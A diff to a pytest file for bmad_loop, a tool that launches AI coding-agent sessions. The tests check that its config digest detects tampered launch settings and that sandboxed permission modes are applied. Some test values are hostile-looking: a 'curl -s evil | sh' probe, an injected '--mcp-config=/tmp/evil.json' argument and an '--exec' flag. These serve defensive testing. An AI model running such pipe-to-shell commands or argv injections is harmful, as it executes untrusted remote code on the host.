@@ -29,7 +29,7 @@ import pytest
 from bmad_loop import bmadconfig
 from bmad_loop import journal as journal_mod
 from bmad_loop import policy as policy_mod
-from bmad_loop import runs, runsetup
+from bmad_loop import runs, runsetup, worksource
 from bmad_loop.adapters.profile import ProfileError
 from bmad_loop.journal import Journal, load_state, state_lock
 from bmad_loop.model import RunState
@@ -151,6 +151,13 @@ def test_digest_preserves_verify_command_order(pinned):
             'prompt_template = "--mcp-config=/tmp/evil.json"\nbinary = "mycli"',
             id="prompt_template",
         ),
+        # session_id_flag is an argv FLAG `build_command` appends to the launched
+        # command (DW-505): an overlay that adds one adds a launched option.
+        pytest.param(
+            'binary = "mycli"',
+            'session_id_flag = "--exec"\nbinary = "mycli"',
+            id="session_id_flag",
+        ),
     ],
 )
 def test_digest_moves_on_any_resolved_profile_launch_field(pinned, old, new):
@@ -161,6 +168,77 @@ def test_digest_moves_on_any_resolved_profile_launch_field(pinned, old, new):
     before = _digest(pinned)
     _rewrite_profile(pinned, old, new)
     assert _digest(pinned) != before
+
+
+def test_digest_moves_on_a_rewritten_session_id_flag(pinned):
+    """Rewriting an existing `session_id_flag` swaps which option the minted id is
+    handed to, so it moves the digest too — not only adding one."""
+    with_flag = PROFILE.replace(
+        'binary = "mycli"', 'session_id_flag = "--session-id"\nbinary = "mycli"'
+    )
+    (pinned / PROFILE_REL).write_text(with_flag, encoding="utf-8")
+    before = _digest(pinned)
+    (pinned / PROFILE_REL).write_text(
+        with_flag.replace('"--session-id"', '"--resume"'), encoding="utf-8"
+    )
+    assert _digest(pinned) != before
+
+
+def _pre_session_id_flag_digest(project, policy_text=POLICY) -> str:
+    """The digest payload exactly as it was shaped before `session_id_flag`
+    existed, rebuilt by hand — the value a run paused on the previous release
+    stamped."""
+    policy = policy_mod.loads(policy_text)
+    profiles = runsetup.resolve_profiles(policy, project)
+    launch = {}
+    for role in runsetup.ROLES:
+        cfg = policy.adapter.resolved(role)
+        prof = profiles[role]
+        launch[role] = {
+            "binary": prof.binary,
+            "launch_args": list(prof.launch_args),
+            "bypass_args": list(prof.bypass_args),
+            "model_flag": prof.model_flag,
+            "prompt_template": prof.prompt_template,
+            "env": dict(prof.env),
+            "adapter": prof.adapter,
+            "hookless": prof.hookless,
+            "extra_args": None if cfg.extra_args is None else list(cfg.extra_args),
+        }
+    payload = {
+        "verify_commands": list(policy.verify.commands),
+        "plugins_enabled": sorted(policy.plugins.enabled),
+        "profiles": launch,
+    }
+    return hashlib.sha256(json.dumps(payload, sort_keys=True).encode("utf-8")).hexdigest()
+
+
+@pytest.mark.parametrize("line", ["", 'session_id_flag = ""\n'], ids=["absent", "empty"])
+def test_an_unset_session_id_flag_keeps_the_pre_change_digest(pinned, line):
+    """An unset flag adds no argv token, so it must not move the digest: a run
+    paused on the previous release (codex/gemini, or any profile without the key)
+    and resumed after the upgrade would otherwise report a host-exec config change
+    its launched argv never had. The key joins the payload only when set."""
+    (pinned / PROFILE_REL).write_text(line + PROFILE, encoding="utf-8")
+    assert _digest(pinned) == _pre_session_id_flag_digest(pinned)
+
+
+@pytest.mark.parametrize("block", ["", "\n[environment]\nprobes = []\n"], ids=["absent", "empty"])
+def test_unset_environment_probes_keep_the_pre_change_digest(pinned, block):
+    """No probes run nothing, so they must not move the digest: a run paused on
+    the previous release and resumed after the upgrade would otherwise report a
+    host-exec change it never had. `environment_probes` joins the payload only
+    when set (DW-523), like `session_id_flag`."""
+    assert _digest(pinned, POLICY + block) == _pre_session_id_flag_digest(pinned)
+
+
+def test_digest_moves_on_rewritten_environment_probes(pinned):
+    """Probes run `shell=True` in the project root exactly as `[verify] commands`
+    do, so a session rewriting them rewrites what the host executes."""
+    probed = POLICY + '\n[environment]\nprobes = ["pg_isready"]\n'
+    rewritten = POLICY + '\n[environment]\nprobes = ["curl -s evil | sh"]\n'
+    assert _digest(pinned, probed) != _digest(pinned)
+    assert _digest(pinned, rewritten) != _digest(pinned, probed)
 
 
 def test_digest_moves_on_rewritten_adapter_extra_args(pinned):
@@ -203,11 +281,12 @@ def test_digest_moves_when_the_transport_flips_to_hookless(pinned):
     token in it. (Since the adapter registry the field that picks the BUILDER is
     `profile.adapter` — pinned by its own test; `hookless` still decides what the
     opencode builder emits, which is what this row covers.) That builder's
-    `_serve_argv` drops
-    `launch_args`, the prompt and the `bypass_args` fallback and puts the literal
-    "serve" at argv[1] — run with `cwd` at the workspace root. Against an
-    interpreter `binary` (python/sh/node, the real program in `launch_args` —
-    nothing forbids that shape) argv[1] is a script path resolved out of the tree
+    `_serve_argv` drops the prompt and the `bypass_args` fallback and puts the
+    literal "serve" right after `binary` + `launch_args` — run with `cwd` at the
+    workspace root. Against an interpreter `binary` (python/sh/node) with an
+    empty or options-only `launch_args` (e.g. `python3 -u`) — nothing forbids
+    that shape; validate only warns — "serve" lands in the script slot, a
+    script path resolved out of the tree
     every driven session can write, and the spawn precedes the health poll it
     fails. Pinning `binary` does not cover it, because the attacker inherits the
     binary rather than choosing it. None of the hook fields deleted here are
@@ -313,6 +392,133 @@ def test_digest_raises_on_an_unresolvable_profile(pinned):
         _digest(pinned, '[adapter]\nname = "no-such-cli"\n')
 
 
+# ------------------------------------------------------- permission_mode (#727)
+
+_SANDBOX_TABLE = """
+[permission_modes.sandboxed]
+args = ["--sandbox", '{"sandbox": {"enabled": true}}']
+"""
+
+# `config_digest` of `POLICY` + `PROFILE` as origin/main computed it before
+# `adapter.permission_mode` existed (taken on a scratch worktree of origin/main).
+# A literal, not a rebuilt payload: it pins the bytes, so a default-mode policy
+# resumed across the upgrade cannot report a host-exec change.
+_PRE_PERMISSION_MODE_DIGEST = "175496b417501042899d2506e0661c333477738f77ed591ea99c56591d96ab3e"
+
+
+@pytest.mark.parametrize("line", ["", 'permission_mode = "bypass"'], ids=["absent", "explicit"])
+def test_default_permission_mode_keeps_the_pre_change_digest_bytes(pinned, line):
+    (pinned / PROFILE_REL).write_text(PROFILE + _SANDBOX_TABLE, encoding="utf-8")
+    text = _with_adapter_key(line) if line else POLICY
+    assert _digest(pinned, text) == _PRE_PERMISSION_MODE_DIGEST
+    assert _digest(pinned, text) == _pre_session_id_flag_digest(pinned, text)
+
+
+def test_sandboxed_permission_mode_moves_the_digest_and_hashes_its_args(pinned):
+    (pinned / PROFILE_REL).write_text(PROFILE + _SANDBOX_TABLE, encoding="utf-8")
+    sandboxed = _with_adapter_key('permission_mode = "sandboxed"')
+    before = _digest(pinned, sandboxed)
+    assert before != _PRE_PERMISSION_MODE_DIGEST
+    # the mode's args are what is launched, so rewriting them moves the pin
+    (pinned / PROFILE_REL).write_text(
+        PROFILE + _SANDBOX_TABLE.replace('"--sandbox"', '"--no-sandbox"'), encoding="utf-8"
+    )
+    assert _digest(pinned, sandboxed) != before
+
+
+def test_linked_worktree_args_are_hashed_only_when_declared(pinned):
+    """DW-599: the grant template adds argv tokens in a linked worktree, so it is
+    pinned; a mode that declares none hashes no key (its digest is unchanged)."""
+    sandboxed = _with_adapter_key('permission_mode = "sandboxed"')
+    (pinned / PROFILE_REL).write_text(PROFILE + _SANDBOX_TABLE, encoding="utf-8")
+    without = _digest(pinned, sandboxed)
+    grant = 'linked_worktree_args = ["-g", "{gitdir}"]\n'
+    (pinned / PROFILE_REL).write_text(PROFILE + _SANDBOX_TABLE + grant, encoding="utf-8")
+    declared = _digest(pinned, sandboxed)
+    assert declared != without
+    (pinned / PROFILE_REL).write_text(
+        PROFILE + _SANDBOX_TABLE + grant.replace('"-g"', '"-G"'), encoding="utf-8"
+    )
+    assert _digest(pinned, sandboxed) not in (without, declared)
+    # bypass never resolves the mode, so the declared template is not launched
+    assert _digest(pinned, POLICY) == _PRE_PERMISSION_MODE_DIGEST
+
+
+def test_digest_raises_on_an_unmapped_permission_mode(pinned):
+    """The same rule as an unknown profile: the launch refuses the mode, so the
+    digest must not hash a launch surface that never runs."""
+    with pytest.raises(ProfileError, match="no permission_mode 'sandboxed' mapping"):
+        _digest(pinned, _with_adapter_key('permission_mode = "sandboxed"'))
+
+
+def _mode_adapters(project, monkeypatch, policy_text):
+    from conftest import install_bmad_config
+
+    from bmad_loop.adapters import multiplexer as mux_mod
+
+    monkeypatch.setattr(mux_mod, "_usable", lambda mux: True)
+    install_bmad_config(project)
+    profiles = project.project / ".bmad-loop" / "profiles"
+    profiles.mkdir(parents=True, exist_ok=True)
+    (profiles / "mycli.toml").write_text(PROFILE + _SANDBOX_TABLE, encoding="utf-8")
+    run_dir = project.project / ".bmad-loop" / "runs" / RUN_ID
+    run_dir.mkdir(parents=True)
+    return runsetup.make_adapters(project.project, run_dir, policy_mod.loads(policy_text))
+
+
+def _launched_argv(adapter, project) -> list[str]:
+    from bmad_loop.adapters.base import SessionSpec
+
+    spec = SessionSpec(
+        task_id="1-1-a-dev-1",
+        role="dev",
+        prompt="/bmad-dev-auto 1-1-a",
+        cwd=project.project,
+        env={},
+        model="",
+        timeout_s=30.0,
+    )
+    return adapter.interactive_argv(spec)
+
+
+def test_make_adapters_launches_the_sandboxed_argv(project, monkeypatch):
+    """ABLATION: drop the `for_permission_mode` application in `make_adapters`
+    and the dev session launches `--yes` (the bypass args) instead."""
+    adapters = _mode_adapters(
+        project, monkeypatch, '[adapter]\nname = "mycli"\npermission_mode = "sandboxed"\n'
+    )
+    for role in ("dev", "triage"):
+        argv = _launched_argv(adapters[role], project)
+        assert argv[-2:] == ["--sandbox", '{"sandbox": {"enabled": true}}'], role
+        assert "--yes" not in argv
+
+
+def test_make_adapters_keeps_the_bypass_argv_by_default(project, monkeypatch):
+    adapters = _mode_adapters(project, monkeypatch, '[adapter]\nname = "mycli"\n')
+    assert _launched_argv(adapters["dev"], project)[-1] == "--yes"
+
+
+def test_extra_args_still_replace_the_sandboxed_args(project, monkeypatch):
+    adapters = _mode_adapters(
+        project,
+        monkeypatch,
+        '[adapter]\nname = "mycli"\npermission_mode = "sandboxed"\nextra_args = ["--mine"]\n',
+    )
+    argv = _launched_argv(adapters["dev"], project)
+    assert argv[-1] == "--mine"
+    assert "--sandbox" not in argv and "--yes" not in argv
+
+
+def test_make_adapters_refuses_an_unmapped_permission_mode(project, monkeypatch):
+    with pytest.raises(SystemExit, match="adapter review session: .*no permission_mode"):
+        _mode_adapters(
+            project,
+            monkeypatch,
+            '[adapter]\nname = "mycli"\n[adapter.review]\nname = "gemini"\n'
+            'permission_mode = "sandboxed"\n',
+        )
+
+
 # --------------------------------------------------------- composition unwind
 
 # A fixed, well-formed run id, so the assertions can name the two directories a
@@ -365,9 +571,10 @@ class _CapturingEngine:
 
 
 def _split_root_paths(project):
-    """`_fake_paths` with the one supported divergence: `repo_root` naming a code
-    tree that is not the BMAD project dir (`isolation = "none"` plus a `repo_root:`
-    key; `bmadconfig.worktree_isolation_conflict` refuses the other combination).
+    """`_fake_paths` with the divergence a `repo_root:` key configures: `repo_root`
+    naming a code tree that is not the BMAD project dir (supported beside
+    `isolation = "none"`; beside worktree isolation only when it contains the project,
+    `bmadconfig.worktree_isolation_conflict` refusing a disjoint one — DW-379).
 
     `_fake_paths` leaves the two roots identical — as does the `project` fixture
     everywhere else — so without this no composition test can tell a `repo_root`
@@ -583,6 +790,114 @@ def test_resume_defaults_old_sweep_options_to_unrestricted(tmp_path, monkeypatch
 
     assert composed.engine.kwargs["only_ids"] is None
     assert composed.engine.kwargs["min_severity"] is None
+
+
+def test_resume_sweeps_the_displaced_registry_and_reports_what_it_could_not_ask(
+    tmp_path, monkeypatch, capsys
+):
+    """The resume's stale-session sweep reaches the registries the session may
+    predate (psmux's name mutex spans registries, so a survivor there blocks the
+    new session's create), and a registry it could not ask is journalled and
+    warned about rather than folded into "nothing there".
+
+    Ablate the `runs.kill_displaced_session` call in `compose_resume` and
+    `swept` stays empty."""
+    run_dir = tmp_path / runs.RUNS_DIR / RUN_ID
+    run_dir.mkdir(parents=True)
+    state = RunState(run_id=RUN_ID, project=str(tmp_path), started_at="now", run_type="sweep")
+    swept = []
+    monkeypatch.setattr(runs, "kill_session", lambda _run_id: None)
+
+    def displaced(project, run_id):
+        swept.append((project, run_id))
+        return ["C:\\old: could not be listed: boom"]
+
+    monkeypatch.setattr(runs, "kill_displaced_session", displaced)
+    journal = Journal(run_dir)
+
+    runsetup.compose_resume(
+        project=tmp_path,
+        paths=_fake_paths(tmp_path),
+        run_dir=run_dir,
+        state=state,
+        policy=policy_mod.loads(""),
+        journal=journal,
+        sweep_factory=lambda _trigger, *, started: None,
+        make_adapters=_accepting_adapters,
+        engine_cls=_CapturingEngine,
+        stories_engine_cls=_CapturingEngine,
+        sweep_engine_cls=_CapturingEngine,
+    )
+
+    assert swept == [(tmp_path, RUN_ID)]
+    details = [
+        e.get("detail")
+        for e in journal.entries()
+        if e.get("kind") == "displaced-session-not-cleared"
+    ]
+    assert details == ["C:\\old: could not be listed: boom"]
+    assert "could not be listed: boom" in capsys.readouterr().err
+
+
+class _SharedRegistryWithForeignR1:
+    """A shared (honoured, #729) registry holding another project's tagged
+    session under this run's name — just what the ownership gate reads."""
+
+    def __init__(self, root):
+        self._root = root
+        self.killed: list[str] = []
+
+    def has_registry_namespace(self):
+        return True
+
+    def registry_root(self):
+        return self._root
+
+    def session_name_key(self, name):
+        return name
+
+    def list_sessions_reporting(self, *, on_fault=None):
+        return [runs.session_name(RUN_ID)]
+
+    def session_options(self, _option):
+        return {runs.session_name(RUN_ID): "0123456789abcdef"}
+
+    def kill_session(self, name):
+        self.killed.append(name)
+
+
+def test_resume_leaves_another_projects_same_named_session_alone(tmp_path, monkeypatch, capsys):
+    """Resume drops a stale agent session by name. In a registry shared with
+    another project, `bmad-loop-<id>` may be that project's live session, and
+    killing it would end its coding process: the real `runs.kill_session` gate
+    refuses and says so.
+
+    Ablate the gate in `runs.kill_session` and `mux.killed` holds the
+    neighbour's session."""
+    run_dir = tmp_path / runs.RUNS_DIR / RUN_ID
+    run_dir.mkdir(parents=True)
+    state = RunState(run_id=RUN_ID, project=str(tmp_path), started_at="now", run_type="sweep")
+    mux = _SharedRegistryWithForeignR1(str(tmp_path / "shared"))
+    monkeypatch.setattr(runs, "get_multiplexer", lambda: mux)
+    monkeypatch.setattr(runs, "_SETTLED_PROJECT", tmp_path)
+    monkeypatch.setattr(runs, "kill_displaced_session", lambda _project, _run_id: [])
+
+    runsetup.compose_resume(
+        project=tmp_path,
+        paths=_fake_paths(tmp_path),
+        run_dir=run_dir,
+        state=state,
+        policy=policy_mod.loads(""),
+        journal=Journal(run_dir),
+        sweep_factory=lambda _trigger, *, started: None,
+        make_adapters=_accepting_adapters,
+        engine_cls=_CapturingEngine,
+        stories_engine_cls=_CapturingEngine,
+        sweep_engine_cls=_CapturingEngine,
+    )
+
+    assert mux.killed == []
+    assert "refused" in capsys.readouterr().err
 
 
 def test_missing_sweep_options_requires_current_state_marker(tmp_path):
@@ -1006,7 +1321,7 @@ def test_composition_persists_the_code_root(tmp_path, run_type):
             epic_filter=None,
             story_filter=None,
             max_stories=None,
-            stories_on=False,
+            source="sprint-status",
             spec_folder="",
             sweep_factory=lambda _trigger, *, started: None,
             make_adapters=_accepting_adapters,
@@ -1038,6 +1353,349 @@ def test_composition_persists_the_code_root(tmp_path, run_type):
     assert persisted.repo_root == str(paths.repo_root)
     assert persisted.code_root == paths.repo_root
     assert persisted.code_root != Path(persisted.project)
+
+
+@pytest.mark.parametrize("run_type", ["run", "sweep"])
+def test_composition_records_the_run_dir_mint_identity(tmp_path, monkeypatch, run_type):
+    """DW-446: both composers persist the run dir's mint-time identity — the
+    `(st_dev, st_ino)` of the claim `_claim_run_dir` took when it created the
+    directory — as `RunState.run_dir_identity`, which the verify-stream pin compares
+    against. Both, because `compose_run` goes through `build_run_state` and
+    `compose_sweep` constructs `RunState` inline.
+
+    Graded against the CLAIM, which is spied. Asserted on the persisted state.
+
+    Ablation: drop `run_dir_identity=` at either composer and that parametrization
+    reddens alone (None)."""
+    claims: list[os.stat_result] = []
+    real_claim = runsetup._claim_run_dir
+
+    def spy_claim(run_dir):
+        claim = real_claim(run_dir)
+        claims.append(claim)
+        return claim
+
+    monkeypatch.setattr(runsetup, "_claim_run_dir", spy_claim)
+    if run_type == "run":
+        composed = runsetup.compose_run(
+            project=tmp_path,
+            paths=_fake_paths(tmp_path),
+            policy=policy_mod.loads(""),
+            run_id=RUN_ID,
+            epic_filter=None,
+            story_filter=None,
+            max_stories=None,
+            source="sprint-status",
+            spec_folder="",
+            sweep_factory=lambda _trigger, *, started: None,
+            make_adapters=_accepting_adapters,
+            engine_cls=_AcceptingEngine,
+            stories_engine_cls=_AcceptingEngine,
+            trusted_config_digest="deadbeef",
+        )
+    else:
+        composed = _run_compose_sweep(tmp_path, _accepting_adapters, engine_cls=_AcceptingEngine)
+
+    (claim,) = claims
+    persisted = load_state(composed.run_dir)
+    assert persisted.run_dir_identity == (claim.st_dev, claim.st_ino)
+    current = os.lstat(composed.run_dir)
+    assert persisted.run_dir_identity == (current.st_dev, current.st_ino)
+
+
+def test_claim_identity_is_none_for_a_zero_inode():
+    """A zero inode carries no identity (it never matches), so it records None and
+    the verify stream refuses. On the dir-fd arm that is unchanged; the win32 arm,
+    which used to write through a zero-inode run dir, now refuses it (accepted
+    2026-09-27)."""
+    zero = os.stat_result((0o040755, 0, 5, 0, 0, 0, 0, 0, 0, 0))
+    assert runsetup._claim_identity(zero) is None
+    real = os.stat_result((0o040755, 9, 5, 0, 0, 0, 0, 0, 0, 0))
+    assert runsetup._claim_identity(real) == (5, 9)
+
+
+@pytest.mark.parametrize("composer", ["run", "resume"])
+def test_story_compositions_wire_the_retro_adapter(tmp_path, monkeypatch, composer):
+    """DW-389: `compose_run` and the story branch of `compose_resume` hand the
+    engine the `retro` role's own adapter, so an `[adapter.retro]` override drives
+    the auto-retrospective session rather than silently falling back to dev.
+
+    Ablation: drop `retro_adapter=adapters["retro"]` from either composer and that
+    parametrization reddens alone (the kwarg is then absent)."""
+    built = {role: object() for role in runsetup.ROLES}
+
+    def make_adapters(*_a, **_k):
+        return dict(built)
+
+    if composer == "run":
+        composed = runsetup.compose_run(
+            project=tmp_path,
+            paths=_fake_paths(tmp_path),
+            policy=policy_mod.loads(""),
+            run_id=RUN_ID,
+            epic_filter=None,
+            story_filter=None,
+            max_stories=None,
+            source="sprint-status",
+            spec_folder="",
+            sweep_factory=lambda _trigger, *, started: None,
+            make_adapters=make_adapters,
+            engine_cls=_CapturingEngine,
+            stories_engine_cls=_CapturingEngine,
+            trusted_config_digest="deadbeef",
+        )
+    else:
+        run_dir = tmp_path / runs.RUNS_DIR / RUN_ID
+        run_dir.mkdir(parents=True)
+        monkeypatch.setattr(runs, "kill_session", lambda _run_id: None)
+        composed = runsetup.compose_resume(
+            project=tmp_path,
+            paths=_fake_paths(tmp_path),
+            run_dir=run_dir,
+            state=RunState(run_id=RUN_ID, project=str(tmp_path), started_at="now"),
+            policy=policy_mod.loads(""),
+            journal=Journal(run_dir),
+            sweep_factory=lambda _trigger, *, started: None,
+            make_adapters=make_adapters,
+            engine_cls=_CapturingEngine,
+            stories_engine_cls=_CapturingEngine,
+            sweep_engine_cls=_CapturingEngine,
+        )
+
+    assert composed.engine.kwargs["retro_adapter"] is built["retro"]
+    assert composed.engine.kwargs["adapter"] is built["dev"]
+
+
+class _SprintCapturingEngine(_CapturingEngine):
+    """`engine_cls` stand-in distinguishable from the stories one by type."""
+
+
+class _StoriesCapturingEngine(_CapturingEngine):
+    """`stories_engine_cls` stand-in distinguishable from the sprint one by type."""
+
+
+class _TicketsCapturingEngine(_CapturingEngine):
+    """`tickets_engine_cls` stand-in distinguishable from the other two by type."""
+
+
+# The kwargs both story composers hand either engine class; the stories class
+# additionally receives `spec_folder`.
+_STORY_ENGINE_KWARGS = {
+    "paths",
+    "policy",
+    "adapter",
+    "review_adapter",
+    "retro_adapter",
+    "run_dir",
+    "journal",
+    "state",
+    "max_stories",
+    "epic_filter",
+    "story_filter",
+    "sweep_factory",
+    "plugin_grants",
+}
+
+
+def _compose_run_for_source(project, *, source, spec_folder):
+    """The one `compose_run` call the per-source pin makes — kept in a single
+    helper so a signature change to `compose_run` is a one-line edit."""
+    return runsetup.compose_run(
+        project=project,
+        paths=_fake_paths(project),
+        policy=policy_mod.loads(""),
+        run_id=RUN_ID,
+        epic_filter=None,
+        story_filter=None,
+        max_stories=None,
+        source=source,
+        spec_folder=spec_folder,
+        sweep_factory=lambda _trigger, *, started: None,
+        make_adapters=_accepting_adapters,
+        engine_cls=_SprintCapturingEngine,
+        stories_engine_cls=_StoriesCapturingEngine,
+        tickets_engine_cls=_TicketsCapturingEngine,
+        trusted_config_digest="deadbeef",
+    )
+
+
+@pytest.mark.parametrize(
+    ("source", "pinned"),
+    [("tickets", True), ("sprint-status", False), ("stories", False)],
+)
+def test_build_run_state_pins_initiative_for_tickets_only(tmp_path, source, pinned):
+    """A tickets run records the active initiative and its folder, which its tree
+    reads compare against the live config; every other source records them
+    empty, so a v6 state is unchanged. Ablation (performed): stamp the pins for
+    every source and the sprint and stories rows FAIL; drop the stamp and the
+    tickets row FAILS."""
+    state = runsetup.build_run_state(
+        run_id=RUN_ID,
+        project=tmp_path,
+        repo_root=tmp_path,
+        policy=policy_mod.loads(""),
+        epic_filter=None,
+        story_filter=None,
+        max_stories=None,
+        source=source,
+        spec_folder="",
+        trusted_config_digest="deadbeef",
+        run_dir_identity=None,
+        initiative="shop",
+        initiative_folder=str(tmp_path / "_bmad-output" / "shop"),
+    )
+
+    expected = ("shop", str(tmp_path / "_bmad-output" / "shop")) if pinned else ("", "")
+    assert (state.initiative, state.initiative_folder) == expected
+
+
+def _build_run_state_for_source(project, *, source, spec_folder):
+    """The one `build_run_state` call the per-source pin makes (see above)."""
+    return runsetup.build_run_state(
+        run_id=RUN_ID,
+        project=project,
+        repo_root=project,
+        policy=policy_mod.loads(""),
+        epic_filter=None,
+        story_filter=None,
+        max_stories=None,
+        source=source,
+        spec_folder=spec_folder,
+        trusted_config_digest="deadbeef",
+        run_dir_identity=None,
+    )
+
+
+@pytest.mark.parametrize(
+    ("source", "engine_type", "extra_kwargs", "persisted_folder"),
+    [
+        ("sprint-status", _SprintCapturingEngine, set(), ""),
+        ("stories", _StoriesCapturingEngine, {"spec_folder"}, "epic-1"),
+        ("tickets", _TicketsCapturingEngine, set(), ""),
+    ],
+    ids=["sprint", "stories", "tickets"],
+)
+def test_compose_run_engine_class_per_source(
+    tmp_path, source, engine_type, extra_kwargs, persisted_folder
+):
+    """Characterization pin for the WorkSource refactor: `compose_run` builds
+    `engine_cls` for a sprint launch, `stories_engine_cls` (plus `spec_folder`)
+    for a stories launch and `tickets_engine_cls` for a tickets launch, stamping `source` / `spec_folder` on the state — in
+    memory, on disk, and on the `run-start` journal row. `build_run_state` drops a
+    spec folder handed to a sprint launch (persists "")."""
+    composed = _compose_run_for_source(tmp_path, source=source, spec_folder="epic-1")
+
+    assert type(composed.engine) is engine_type
+    assert set(composed.engine.kwargs) == _STORY_ENGINE_KWARGS | extra_kwargs
+    if source == "stories":
+        assert composed.engine.kwargs["spec_folder"] == "epic-1"
+    assert composed.engine.kwargs["state"] is composed.state
+    assert (composed.state.source, composed.state.spec_folder) == (source, persisted_folder)
+    persisted = load_state(composed.run_dir)
+    assert (persisted.source, persisted.spec_folder) == (source, persisted_folder)
+    (start,) = [e for e in composed.journal.entries() if e["kind"] == "run-start"]
+    assert start["source"] == source
+
+    state = _build_run_state_for_source(tmp_path, source=source, spec_folder="epic-1")
+    assert (state.source, state.spec_folder) == (source, persisted_folder)
+
+
+def test_compose_run_journal_is_pinned_to_the_claimed_identity(tmp_path):
+    """The composer pins its journal to the `RunState` carrying the claimed run-dir
+    identity, built FIRST so the pin exists before any row: the journal writes no
+    `journal-unpinned` notice and `run-start` stays the run's first row.
+
+    Ablation: build `Journal(run_dir)` bare and `journal.pin is state` reddens; pin it
+    to a record-less state and the first row is the notice instead."""
+    composed = _compose_run_for_source(tmp_path, source="sprint-status", spec_folder="")
+
+    assert composed.journal.pin is composed.state
+    assert composed.state.run_dir_identity is not None
+    kinds = [e["kind"] for e in composed.journal.entries()]
+    assert kinds[0] == "run-start"
+    assert "journal-unpinned" not in kinds
+
+
+def test_compose_run_tickets_builds_tickets_engine(project_v7):
+    """A tickets launch with no injected class builds the real `TicketsEngine`
+    on the v7 sandbox, pinned to the active initiative — and a resume of that
+    run selects the same class from the persisted source. Ablation (performed):
+    drop the tickets arm of `_engine_cls_for` and the sprint `Engine` is built —
+    this FAILS; flip `TRAITS["tickets"].runnable` back and both launches refuse."""
+    from bmad_loop.adapters.mock import MockAdapter
+    from bmad_loop.engine import Engine
+    from bmad_loop.stories_engine import StoriesEngine
+    from bmad_loop.tickets_engine import TicketsEngine
+
+    paths = bmadconfig.load_paths(project_v7.project, want_tickets=True)
+    composed = runsetup.compose_run(
+        project=project_v7.project,
+        paths=paths,
+        policy=policy_mod.loads('[stories]\nsource = "tickets"\n'),
+        run_id=RUN_ID,
+        epic_filter=None,
+        story_filter=None,
+        max_stories=None,
+        source="tickets",
+        spec_folder="",
+        sweep_factory=lambda _trigger, *, started: None,
+        make_adapters=lambda *_a, **_k: {role: MockAdapter([]) for role in runsetup.ROLES},
+        engine_cls=Engine,
+        stories_engine_cls=StoriesEngine,
+        trusted_config_digest="deadbeef",
+    )
+
+    assert type(composed.engine) is TicketsEngine
+    persisted = load_state(composed.run_dir)
+    assert (persisted.source, persisted.initiative) == ("tickets", project_v7.initiative)
+    assert persisted.initiative_folder == str(paths.initiative_folder)
+    assert runsetup._engine_cls_for(
+        persisted.source, "", engine_cls=Engine, stories_engine_cls=StoriesEngine
+    ) == (TicketsEngine, {})
+
+
+@pytest.mark.parametrize(("source", "error"), [("bogus", worksource.UnknownSource)])
+def test_compose_resume_refuses_a_source_it_cannot_drive(tmp_path, monkeypatch, source, error):
+    """`compose_resume` refuses a persisted story run whose source this version
+    cannot drive — unknown to the registry (a newer bmad-loop wrote it), or
+    registered but not runnable yet — before any side effect: no session kill,
+    no adapters, no journal row. It used to rebuild an unknown source as a sprint
+    run.
+
+    Ablation (performed): restoring the sprint fallback in `_engine_cls_for` turns
+    the `bogus` row red; moving the engine selection back below the session kills
+    and the adapter build turns both rows red (the build is reached)."""
+    run_dir = tmp_path / runs.RUNS_DIR / RUN_ID
+    run_dir.mkdir(parents=True)
+    killed: list[str] = []
+    monkeypatch.setattr(runs, "kill_session", killed.append)
+    monkeypatch.setattr(runs, "kill_displaced_session", lambda _project, _run_id: [])
+    journal = Journal(run_dir)
+    state = RunState(
+        run_id=RUN_ID,
+        project=str(tmp_path),
+        started_at="now",
+        source=source,
+        spec_folder="epic-1",
+    )
+
+    with pytest.raises(error, match=repr(source)):
+        runsetup.compose_resume(
+            project=tmp_path,
+            paths=_fake_paths(tmp_path),
+            run_dir=run_dir,
+            state=state,
+            policy=policy_mod.loads(""),
+            journal=journal,
+            sweep_factory=lambda _trigger, *, started: None,
+            make_adapters=_NeverBuilt,
+            engine_cls=_NeverBuilt,
+            stories_engine_cls=_NeverBuilt,
+            sweep_engine_cls=_NeverBuilt,
+        )
+
+    assert killed == []
+    assert journal.entries() == []
 
 
 @pytest.mark.parametrize("run_type", ["run", "sweep"])
@@ -1077,7 +1735,7 @@ def test_initial_state_and_pid_are_one_locked_publication(tmp_path, monkeypatch,
                     epic_filter=None,
                     story_filter=None,
                     max_stories=None,
-                    stories_on=False,
+                    source="sprint-status",
                     spec_folder="",
                     sweep_factory=lambda _trigger, *, started: None,
                     make_adapters=_accepting_adapters,
@@ -1185,7 +1843,7 @@ def test_compose_run_unwinds_the_run_when_the_adapters_abort(unwinding):
             epic_filter=None,
             story_filter=None,
             max_stories=None,
-            stories_on=False,
+            source="sprint-status",
             spec_folder="",
             sweep_factory=lambda _trigger, *, started: None,
             make_adapters=unwinding.make_adapters,
@@ -1342,7 +2000,7 @@ def test_compose_run_unwinds_a_claim_abandoned_before_save_state(unwinding, monk
             epic_filter=None,
             story_filter=None,
             max_stories=None,
-            stories_on=False,
+            source="sprint-status",
             spec_folder="",
             sweep_factory=lambda _trigger, *, started: None,
             make_adapters=unwinding.make_adapters,
@@ -1356,8 +2014,9 @@ def test_compose_run_unwinds_a_claim_abandoned_before_save_state(unwinding, monk
 
 
 def test_compose_sweep_unwinds_when_the_journal_itself_cannot_be_built(unwinding, monkeypatch):
-    """The same window in the sweep composer, at its earliest statement — which is
-    also the one case that reaches `_unwind_composition` with NO journal.
+    """The same window in the sweep composer, at the journal build (right after the
+    `RunState` it is pinned to) — the one case that reaches `_unwind_composition`
+    with NO journal.
 
     That is why this drives `Journal` rather than the `RunState` build: the unwind
     writes a `composition-unwind-failed` entry through the journal it is handed, so
@@ -1372,8 +2031,9 @@ def test_compose_sweep_unwinds_when_the_journal_itself_cannot_be_built(unwinding
     removed on this path at all, which fails alone if the `try` moves back down."""
     built: dict[str, bool] = {}
 
-    def exploding_journal(run_dir):
+    def exploding_journal(run_dir, *, pin):
         built["run_dir"] = run_dir.is_dir()
+        built["pinned"] = pin.run_id == RUN_ID
         raise OSError("journal unavailable")
 
     monkeypatch.setattr(runsetup, "Journal", exploding_journal)
@@ -1393,7 +2053,7 @@ def test_compose_sweep_unwinds_when_the_journal_itself_cannot_be_built(unwinding
             sweep_engine_cls=_NeverBuilt,
             trusted_config_digest="deadbeef",
         )
-    assert built == {"run_dir": True}
+    assert built == {"run_dir": True, "pinned": True}
     assert not runs.run_dir_for(unwinding.project, RUN_ID).exists()
     assert unwinding.published == {}
 
@@ -1455,7 +2115,7 @@ def test_compose_run_refuses_a_run_id_that_already_exists(unwinding):
             epic_filter=None,
             story_filter=None,
             max_stories=None,
-            stories_on=False,
+            source="sprint-status",
             spec_folder="",
